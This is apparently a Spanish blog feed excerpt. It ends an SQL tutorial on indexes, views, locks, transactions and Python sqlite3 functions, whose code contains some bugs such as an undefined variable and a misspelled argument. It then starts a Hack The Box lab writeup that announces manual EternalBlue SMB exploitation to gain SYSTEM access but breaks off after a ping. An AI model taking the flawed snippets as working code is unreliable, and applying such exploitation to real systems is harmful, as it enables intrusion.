&lt;p&gt;Este tipo de indice garantiza que los valores de una columna sean unicos en una tabla, esto implica que no puede haber duplicados en la columna y por ello al crearlos, ademas de mejorar el rendimiento de nuestras consultas verifica que no existan duplicados ni tampoco valores nulos. Puede aplicarse a uno o varios campos.&lt;/p&gt;

&lt;p&gt;Para crear este tipo de indice es similar al ordinario, solo que debemos de agregar la palabra &lt;code&gt;UNIQUE&lt;/code&gt; y lo vamos a crear en nuestra tabla &lt;code&gt;Employees&lt;/code&gt; especificamente en los campos &lt;code&gt;Firtsname&lt;/code&gt; y &lt;code&gt;Lastname&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query89.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera lo que vamos a conseguir es que no se permita crear dos registros que tengan el mismo nombre &lt;code&gt;Firtsname&lt;/code&gt;y apellido &lt;code&gt;Lastname&lt;/code&gt;. En tal sentido podemos crear registros que tengan distintos nombres y apellidos, pero si tratamos de insertar el mismo nombre y el mismo apellido, logicamente ya que dos personas no pueden tener los mismos datos correspondientes funciona como una especie de validación.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query91.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Concluimos que con este tipo de indice ademas que podemos tener un mejor rendimiento en nuestras consultas, tambien nos aseguramos de que no puedan existir valores duplicados. Si lo vemos practicamente en terminos reales es como cuando tratamos de registrarnos con un nombre de usuario y si este ya existe el sistema nos arroja un error, donde nos exige que intentemos con otros nombre de usuario.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Los indices consumen mucho espacio en disco, por ello si creamos demasiados indices podemos generar un impacto negativo, ademas que cuando se hace operaciones de alteracion de una tabla tambien se actualizan los indices y esto relentiza las operaciones de escritura. Por ello debemos de usar indices solo cuando sean necesarios, recomendablemente en consultas que realizamos constantemente o cuando tienen una alta cardinalidad en otras palabras cuando estemos trabajando con muchos indices.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Una ultima cosa es que si queremos borrar los indices, debemos usar &lt;code&gt;DROP INDEX&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query92.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vistas&quot;&gt;VISTAS &lt;a href=&quot;#vistas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una &lt;code&gt;vista&lt;/code&gt; es una representacio virtual de una tabla o de una combinación de tablas, por ello podemos pensar en las vistas como una especie de tabla virtual, estas ademas nos permiten simplificar las consultas especialmente cuando son muy complejas y trabajar sobre estas.&lt;/p&gt;

&lt;p&gt;Supongamos que queremos trabajar sobre la tabla de clientes &lt;code&gt;Customers&lt;/code&gt;, solo si estos son de la ciudad de &lt;code&gt;Madrid&lt;/code&gt; o del pais de &lt;code&gt;España&lt;/code&gt;, para ello tendriamos que realizar el filtro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query93.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora si nosostros quisieramos trabajar unicamente con estos datos, tendriamos que aplicar condicionales, joins o entre otras a esta misma consulta.&lt;/p&gt;

&lt;p&gt;Pero lo que podemos hacer seria crear una &lt;code&gt;vista&lt;/code&gt;, esto lo hacemos con &lt;code&gt;CREATE VIEW&lt;/code&gt; mas el nombre de la vista que le queremos dar y seguidamente usamos &lt;code&gt;AS&lt;/code&gt; para luego haces referencia a sobre que tabla crear nuestra vista. En este caso sobre el resultado de nuestra consulta anterior.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query94.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que ahora cambia de color, ya que ahora se almaceno como vista, y en consecuencia podemos trabajar directamente sobre ella como si fuera una tabla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query95.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora seguro puedes pensar que podemos usarlas todo el timpo y simplificarnos las tareas…&lt;/p&gt;

&lt;p&gt;Pues no siempre por que debemos recordar que al ejecutar la vista, por detras se sigue ejecutando la consulta que la genero, por lo tanto realiza un consumo en disco y si lo aplicamos muchas veces tambien nos dara un problema de rendimiento.&lt;/p&gt;

&lt;p&gt;Pero nos puede servir muchas ocasiones ya que nos simplifica el estar haciendo la misma consulta para un proposito, lo unico es que si las vamos a utilizar procuremos hacerlo de manera equilibrada.&lt;/p&gt;

&lt;p&gt;Y una cosa mas para borrar una &lt;code&gt;vista&lt;/code&gt;, debemos ejecutar &lt;code&gt;DROP VIEW&lt;/code&gt; y el nombre de la vista.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query96.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;pero aqui una observación y es que si ejecutamos el comando nuevamente nos devuelve un error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query97.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por ello igualmente que cuando creamos una tabla se recomienda usar el &lt;code&gt;IF EXISTS&lt;/code&gt; y de este modo verifica que la vista exista antes de borrarla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query98.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;de esta forma ya no nos muestra el error.&lt;/p&gt;

&lt;h2 id=&quot;bloqueos&quot;&gt;BLOQUEOS &lt;a href=&quot;#bloqueos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los bloqueos son los mecanismos de la bae de datos, que se utilizan para para controlar el acceso concurrente a la base de datos. Esto para evitar que en el proceso se realizen cambios conflictivos o se acceda al mismo tiempo a los datos.&lt;/p&gt;

&lt;p&gt;Supongamos tenemos &lt;code&gt;$500&lt;/code&gt; dolares en nuestra cuenta bancaria, pero que pasaria si desde los lugares hacemos un retiro al mismo tiempo, pues lo que sucederia es que nuestra cuenta se quedaria con un valor negativo de &lt;code&gt;-$500&lt;/code&gt; y en vista que eso no puede suceder para ello es que suceden estos mecanismo de bloqueo.&lt;/p&gt;

&lt;p&gt;Existen dos tipos de bloqueos:&lt;/p&gt;

&lt;h2 id=&quot;bloqueos-compartidos-shared-locks&quot;&gt;BLOQUEOS COMPARTIDOS - SHARED LOCKS &lt;a href=&quot;#bloqueos-compartidos-shared-locks&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En este tipo de bloqueo nadie de los usuarios puede escribir, pero si pueden leer. En sintesis cuando nosotros estamos leyendo la base de datos ninguna de las otras conexiones puede escribir, pero si pueden leer.&lt;/p&gt;

&lt;h2 id=&quot;bloqueos-reservados-reserved-locks&quot;&gt;BLOQUEOS RESERVADOS - RESERVED LOCKS &lt;a href=&quot;#bloqueos-reservados-reserved-locks&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es este tipo de bloqueo se aplica cuando estamos escribiendo en la base de datos y en ese momento las otras conexiones no pueden escribir pero si pueden leer.&lt;/p&gt;

&lt;h2 id=&quot;bloqueos-exclusivos-exclusive-locks&quot;&gt;BLOQUEOS EXCLUSIVOS - EXCLUSIVE LOCKS &lt;a href=&quot;#bloqueos-exclusivos-exclusive-locks&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En este tipo de bloqueos se da cuando mientras estamos escribiendo, las demas conexiones no puedan leer y tampoco puedan escribir, o en un caso mas especifico podemos manipularnos segun nos convenga.&lt;/p&gt;

&lt;h2 id=&quot;transacciones-begin-transaction&quot;&gt;TRANSACCIONES - BEGIN TRANSACTION &lt;a href=&quot;#transacciones-begin-transaction&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Son una secuencia de operaciones que se consideran como una unidad logica, estas aseguran que todas las operaciones dentro de ellas se completen de manera exitosa o por el contrario se deshagan en caso de erro.&lt;/p&gt;

&lt;p&gt;Para iniciar una nueva transaccion usamos &lt;code&gt;BEGIN TRANSACTION&lt;/code&gt; o solo &lt;code&gt;BEGIN&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Despues podemos hacer la alteración que queramos en las tablas de la base de datos, por ejemplo puedo cambiar el nombre a un producto, en este caso a &lt;code&gt;Chang&lt;/code&gt; y renombrarlo como &lt;code&gt;Refrescos&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como son consultas separadas debemos hay que separarlas con un &lt;code&gt;;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query99.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues de ejecutar la consulta y visualizamos que se cambia el nombre del producto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query100.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Es aqui donde entran a las transacciones ya que si bien realizamos el cambio, tenemos dos opciones la primera es que si estamos seguros de guardar los cambios ejecutemos &lt;code&gt;COMMIT&lt;/code&gt;, pero en caso de existir un error y queramos volver a la acción anterior y no se efectuen &lt;code&gt;ROLLBACK&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Primero ejecutamos &lt;code&gt;COMMIT&lt;/code&gt;,  de esta manera se efectuan los cambios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query101.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora supongamos que por error modificamos los nombres de todos los productos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query102.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Verificamos y efectivamente se realizaron los cambios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query103.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podriamos pensar que hemos arruinado nuestra base de datos, pero ya que iniciamos una transacción, como mencionaba anteriormente con &lt;code&gt;ROLLBACK&lt;/code&gt;, podemos restaurar los cambios, de modo tal que estos no se guarden.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query104.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y de esta manera ya tenemos claro primero debemos iniciar una transacción con &lt;code&gt;BEGIN&lt;/code&gt;, y una vez se haaya iniciado podemos ejecutar la consulta que queramos de modo tal que si despues queremos guardar los cambio ejecutar un &lt;code&gt;COMMIT&lt;/code&gt;, y si de lo contrario queremos resturarlos usamos &lt;code&gt;ROLLBACK&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;procedimientos-almacenados&quot;&gt;PROCEDIMIENTOS ALMACENADOS &lt;a href=&quot;#procedimientos-almacenados&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es un conjunto de instrucciones que se almancenan en la base de datos y que podemos ejecutarlos cuando queramos para reducir la repetición del codigo, mejora la seguridad por que se limita el acceso directo a la base de datos y aumenta el rendimiento ya que estas operaciones se ejecutan en el servidor de la propia base de datos.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sqlite3&lt;/code&gt; se caracteriza por ser ligero de y facil implementación ya ejecuta como una biblioteca y por lo tanto no soporta procedimientos almacenados por que en principio no los necesita ya que se integra directamente en la aplicación que lo utiliza lo que facilita su portabilidad y en consecuencia es sencillo implementarlo en distintas plataformas y sistemas operativos.&lt;/p&gt;

&lt;p&gt;Por lo tanto cuando queremos ejecutar procedimientos almacenados con &lt;code&gt;sqlite3&lt;/code&gt; lo hacemos desde el backend o lenguaje anfitrion a nivel de aplicación, usando las funciones del lenguaje y aunque estas funciones que podamos definir no son iguales a las de los procedimientos almacenados viene a ser la solución a este problema.&lt;/p&gt;

&lt;h2 id=&quot;sql-y-python&quot;&gt;SQL Y PYTHON &lt;a href=&quot;#sql-y-python&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como mencionamos anteriormente en el apartado anterior necesitamos de un lenguaje para ejecutar nuestras funciones definidas por el usuario y para ello usaremos nada mas y nada menos que &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;funciones-definidas-por-el-usuario&quot;&gt;FUNCIONES DEFINIDAS POR EL USUARIO - USER DEFINED FUNCTIONS &lt;a href=&quot;#funciones-definidas-por-el-usuario&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Son funciones que podemos crear y utilizar dentro de nuestras consultas &lt;code&gt;SQL&lt;/code&gt;. Estas funciones permiten ampliar las funcionalidades de &lt;code&gt;SQLite&lt;/code&gt; realizando calculos o manipulaciones de datos especificos que no estas directamente disponibles en las funciones integradas.&lt;/p&gt;

&lt;p&gt;Y para ello para definir estas funciones utilizaremos &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Comenzaremos importando la libreria de &lt;code&gt;SQLite&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues crearemos una función, en este caso una que nos devuelva el 20% de un valor que reciba como parametro.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def calcular_porcentaje(valor):
    porcentaje = valor * 0.20
    return porcentaje
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que tenemos nuestra función, ahora procederemos a crear una conexión con nuestra base de datos en este caso &lt;code&gt;Northwind.db&lt;/code&gt; y la guardaremos en la variable &lt;code&gt;conn&lt;/code&gt;. Ojo se debe espeficiar la ruta en donde tengas la db.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;conn = sqlite3.connect(&quot;Northwind.db&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora tenemos que registrar nuestra función en nuestra conexión con&lt;code&gt;SQLite&lt;/code&gt;, para ello usamos el metodo &lt;code&gt;create_function&lt;/code&gt; y como primer parametro especificamos el nombre que tendra la función en &lt;code&gt;SQLite&lt;/code&gt; que puedes llamarla como quieras, en este caso la llamare &lt;code&gt;Porcentaje&lt;/code&gt;, despues como segundo valor debemos espeficar el numero de parametros de nuestra función creada que en este caso es &lt;code&gt;1&lt;/code&gt; y finalmente como tercer parametro nuestra función &lt;code&gt;calcular_porcentaje&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;conn.create_function(&quot;porcentaje&quot;, 1, calcular_porcentaje)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez ya tengamos registrada nuestra función, ahora necesitamos crear es algo que nos permite hacer una consulta a la base de datos y obtener una respuesta con todos los datos ya procesados y para ello en &lt;code&gt;Python&lt;/code&gt;, tenemos algo que se llaman &lt;code&gt;cursores&lt;/code&gt; que nos devolveran los resultados ya formateados.&lt;/p&gt;

&lt;p&gt;Asi que creamos un &lt;code&gt;cursor&lt;/code&gt; y lo guardamos en la variable cursor.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;cursor = conn.cursor()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente es ejecutar la consulta y eso lo hacemos con &lt;code&gt;cursor.execute&lt;/code&gt; y dentro podemos ejecutar la consulta que queramos, para este caso vamos a hacer una consulta donde vamos a seleccionar el nombre de los productos de la tabla &lt;code&gt;Products&lt;/code&gt;, el precio normal y ademas nuevamente el precio pero en este es donde vamos a ejecutar nuestra función &lt;code&gt;porcentaje&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;cursor.execute('SELECT ProductName, porcentaje(Price) FROM PRODUCTS')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Los resultados de la consulta vamos a almacenarlos en la variable &lt;code&gt;resultados&lt;/code&gt; y para obtenerlos usaremos el metodo &lt;code&gt;fetchall()&lt;/code&gt; que se utiliza para recuperar todas las filas del conjunto de resultados de una consulta.&lt;/p&gt;

&lt;p&gt;En el caso en el que solo quisieramos recuperar solo una fila, usariamos &lt;code&gt;fetchone()&lt;/code&gt;. Como en este caso queremos el resultado de varias filas usamos &lt;code&gt;fetchall()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;resultados = cursor.fetchall()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finalmente cerrar el cursor y la conexión para liberar los recursos usados.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;cursor.close()
conn.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora si imprimimos los resultados, nos lo devolvera en crudo, de tal forma que no sera bien legible. Para solucionar este problema usaremos otra libreria de &lt;code&gt;Python&lt;/code&gt; llamada &lt;code&gt;pandas&lt;/code&gt; y con ellas vamos a exportar el resultado en un &lt;code&gt;dataframe&lt;/code&gt; que basicamente nos permitira mostrar la información en una especie de tablas.&lt;/p&gt;

&lt;p&gt;Por lo tanto nuestro codigo completo nos quedaria asi:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
import pandas as pd

def calcular_porcentaje(valor):
    porcentaje = valor * 0.20
    return porcentaje

conn = sqlite3.connect(&quot;Northwind.db&quot;)

conn.create_function(&quot;porcentaje&quot;, 1, calcular_porcentaje)

cursor = conn.cursor()

cursor.execute('SELECT ProductName, Price, porcentaje(Price) FROM PRODUCTS')

resultados = cursor.fetchall()

df_resultados = pd.DataFrame(resultados)

print(df_resultados)

cursor.close()

conn.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Al ejecutar nos da como resultado de una majera mas legible los resultados.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query105.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Todo esto que acabamos de hacer es una transacción, ya que estas se inician por el lenguaje anfitrion, tras bambalinas lo que esta haciendo &lt;code&gt;Python&lt;/code&gt; es hacer un &lt;code&gt;BEGIN&lt;/code&gt; automaticamente, entonces una vez que realizamos toda la conexión si queremos que se guarden los cambios hay que usar exacto un &lt;code&gt;COMMIT&lt;/code&gt; y de esta manera hubieramos ejecutado correctamente la conexión.&lt;/p&gt;

&lt;p&gt;Pero existe una manera mas sencilla y optima para hacer exactamente lo mismo, esto nos ayudaria a simplificar nuestro codigo y evitar estar cerrando estas conexiones. Para esto tendriamos que usar &lt;code&gt;with&lt;/code&gt; y manejar los errores con un &lt;code&gt;Try Catch&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Voy a explicar como funciona y por que es mas optimo usar esta opción - aunque en el curso de &lt;code&gt;Python&lt;/code&gt; veremos esto a detalle:&lt;/p&gt;

&lt;p&gt;Bueno principalmente es mas optimo, puesto que cuando usamos &lt;code&gt;with&lt;/code&gt; para conectarnos a la base de datos nos va a garantizar que la conexión se cierre automaticamente al finalizar el bloque de codigo y nos asegura que los recursos de la conexión que establecimos se liberen correctamente aunque ocurran exepciones.&lt;/p&gt;

&lt;p&gt;Pero para estar seguro tambien usaremos un &lt;code&gt;Try Catch&lt;/code&gt;, donde manejaremos las exepciones en el caso pueda existir alguna:&lt;/p&gt;

&lt;p&gt;Como primera exepción usamos &lt;code&gt;sqlite3.Error&lt;/code&gt; que capturara los errores especificos de &lt;code&gt;SQLite&lt;/code&gt; de haberlos y nos mostrara a cual corresponde en pantalla.&lt;/p&gt;

&lt;p&gt;Despues una exepción general con &lt;code&gt;Exception&lt;/code&gt;, si es que el problema no se da necesariamente con &lt;code&gt;SQLite&lt;/code&gt; y de esta manera tambien nos lo reporte al ocurrir.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
import pandas as pd

def calcular_porcentaje(valor):
    porcentaje = valor * 0.20
    return porcentaje

Try:
    with sqlite3.connect(&quot;Northwind.db&quot;) as conn:

        conn.create_function(&quot;porcentaje&quot;, 1, calcular_porcentaje)

        cursor = conn.cursor()

        cursor.execute('SELECT ProductName, Price, porcentaje(Price) FROM PRODUCTS')

        resultados = cursor.fetchall()

        df_resultados = pd.DataFrame(resultados)

        print(df_resultados)

except sqlite3.Error as e:
    print(&quot;Error en la base de datos: &quot;, e)
except Exception as e:
    print(&quot;Error global: &quot;, e)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora para cerrar el cursor, vamos a realizar un ejemplo un poco mas complejo igual desde &lt;code&gt;Python&lt;/code&gt; donde de nuestra base de datos trataremos de obtener los 3 empleados que generaron mas ingresos en general.&lt;/p&gt;

&lt;p&gt;Para ello primero armaremos la estructura de nuestro codigo y importaremos la libreria &lt;code&gt;matplotlib&lt;/code&gt; para visualizarlo los resultados graficamente y esta vez como estamos usando &lt;code&gt;pandas&lt;/code&gt; vamos a usar una función que nos permite leer una consulta &lt;code&gt;SQL&lt;/code&gt; la cual es &lt;code&gt;pd.read_sql_query&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
import pandas as pd
import matplotlib.pyplot as plt

consulta = '''

    
'''
with sqlite3.connect(&quot;Northwind.db&quot;) as conn:

    resultado = pd.read_sql_query(query, conn)

resultado.plot(x=, y=, kind=&quot;bar&quot;, figzise=(10,5), legend=False)
plt.title(&quot;Empleado que genero mas Ingresos&quot;)
plt.xlabel(&quot;Nombre Empleado&quot;)
plt.ylabel(&quot;Monto Total Vendido&quot;)
plt.xticks(rotation=45)
plt.show()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a explicarlo paso a paso:&lt;/p&gt;

&lt;p&gt;Con &lt;code&gt;pd.read_sql_query&lt;/code&gt; que recibe dos parametros, en el primero lo que hacemos es que directamente le pasamos la consulta que queramos ejecutar y como segundo parametro la conexión que esta almancenada en &lt;code&gt;conn&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Despues usamos la libreria &lt;code&gt;matplotlib.pyplot&lt;/code&gt; para crear un &lt;code&gt;plot&lt;/code&gt; que se refiere a crear un grafico, donde con x indicaremos y indicaremos los valores bajo los cuales se creara, que aun no los definimos, despues con &lt;code&gt;kind&lt;/code&gt; indicamos el tipo de grafico que queremos que tenga, en este caso en barras, figzise para indicarle el tamaño que tendra nuestro grafico y despues con &lt;code&gt;legend&lt;/code&gt; si queremos que tenga una leyenda, en este caso no quiero que se vea por ese le pongo &lt;code&gt;false&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Despues con &lt;code&gt;plt.title&lt;/code&gt;, le damos un nombre a nuestra grafica, &lt;code&gt;plt.xlabel&lt;/code&gt; para ponerle un nombre en el eje &lt;code&gt;X&lt;/code&gt; y &lt;code&gt;plt.ylabel&lt;/code&gt; lo mismo para el eje &lt;code&gt;Y&lt;/code&gt;. Despues con &lt;code&gt;xticks&lt;/code&gt; le decimos que el nombre del eje &lt;code&gt;X&lt;/code&gt;, tenga una rotación de 45 grados para que los nombres no salgan uno encima de otro.&lt;/p&gt;

&lt;p&gt;Finalmente con &lt;code&gt;plt.show()&lt;/code&gt; le decimos que nos muestre el grafico.&lt;/p&gt;

&lt;p&gt;Ahora en lo que respecta a nuestra consulta, como queremos seleccionar el empleado que genero mas ingresos, primero vamos a seleccionar los datos del empleado y la suma de la cantidad vendida &lt;code&gt;Quantity&lt;/code&gt; referente a la tabla &lt;code&gt;OrderDetails&lt;/code&gt; por el &lt;code&gt;Precio&lt;/code&gt; correspondiente a la tabla &lt;code&gt;Products&lt;/code&gt; esto de la tabla &lt;code&gt;Employees&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query106.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues vamos a aplicar un &lt;code&gt;JOIN&lt;/code&gt; y buscaremos las coincidencias de las tablas partiendo de &lt;code&gt;Employees&lt;/code&gt; hasta la tabla &lt;code&gt;OrderDetails&lt;/code&gt; donde tenemos la cantidad y a su vez hasta la tabla &lt;code&gt;Products&lt;/code&gt; donde tenemos el precio.&lt;/p&gt;

&lt;p&gt;Esto aunque puede parecer complicado lo haremos basandonos en los &lt;code&gt;ID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query107.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues solo debemos agruparlo basandonos en el &lt;code&gt;EmployeeID&lt;/code&gt; ya que justamente queremos saber el empleado que genero esos ingresos y finalmente debemos ordenarlo por el &lt;code&gt;total_vendido&lt;/code&gt; y establecer un &lt;code&gt;LIMIT&lt;/code&gt; de los tres primeros.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query108.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finalmente debemos añadir esa consulta a nuestra variable &lt;code&gt;consulta&lt;/code&gt; en nuestro codigo y completar tambien los parametros que faltaban en el &lt;code&gt;plot&lt;/code&gt; donde &lt;code&gt;x=Empleado&lt;/code&gt; y &lt;code&gt;y=total_vendido&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
import pandas as pd
import matplotlib.pyplot as plt

consulta = '''
  SELECT Firstname || &quot;&quot; || LastName as Empleado, SUM(od.Quantity * p.Price) AS total_vendido
  FROM Employees e
  JOIN Orders o ON e.EmployeeID = o.EmployeeID
  JOIN OrderDetails od ON o.OrderID = od.OrderID
  JOIN Products p ON od.ProductID = p.ProductID
  GROUP BY e.EmployeeID
  ORDER BY total_vendido DESC
  LIMIT 3
'''
with sqlite3.connect(&quot;Northwind.db&quot;) as conn:

    resultado = pd.read_sql_query(query, conn)

resultado.plot(x=, y=, kind=&quot;bar&quot;, figzise=(10,5), legend=False)
plt.title(&quot;Empleado que genero mas Ingresos&quot;)
plt.xlabel(&quot;Nombre Empleado&quot;)
plt.ylabel(&quot;Monto Total Vendido&quot;)
plt.xticks(rotation=45)
plt.show()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El codigo en &lt;code&gt;python&lt;/code&gt; nos quedaria de esta manera, ahora solo debemos ejecutarlo y obtendremos graficamente los tres empleados que generaron mas ingresos a la empresa.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query109.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y esto seria todo con respecto al curso de &lt;code&gt;SQL&lt;/code&gt;, ahora si estas listo para administrar cualquier base de datos &lt;code&gt;SQL&lt;/code&gt;, espero haberte ayudado. 😃&lt;/p&gt;

&lt;p&gt;Conmigo sera hasta la proxima vez 😄.&lt;/p&gt;

</description>
        <pubDate>Tue, 20 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/articulos/SQL</link>
        <guid isPermaLink="true">http://localhost:4000/articulos/SQL</guid>
        
        <category>Sql</category>
        
        <category>programación</category>
        
        <category>Query</category>
        
        <category>Database</category>
        
        
        <category>articulos</category>
        
      </item>
    
      <item>
        <title>Maquina Blue - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Blue&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad facil, donde explotaremos la famosa vulerabilidad &lt;code&gt;Eternalblue&lt;/code&gt; que afecta a una versión vulnerable del protocolo &lt;code&gt;smb&lt;/code&gt; y mediante la cual podremos realizar ejecución remota de comandos &lt;code&gt;RCE&lt;/code&gt; , esto lo haremos manualmente para comprender mejor la explotación de esta vulnerabilidad y de esta manera ganaremos acceso como el usuario &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Esta maquina es divertida asi que a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Blue
❯ ls
 Blue
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.40
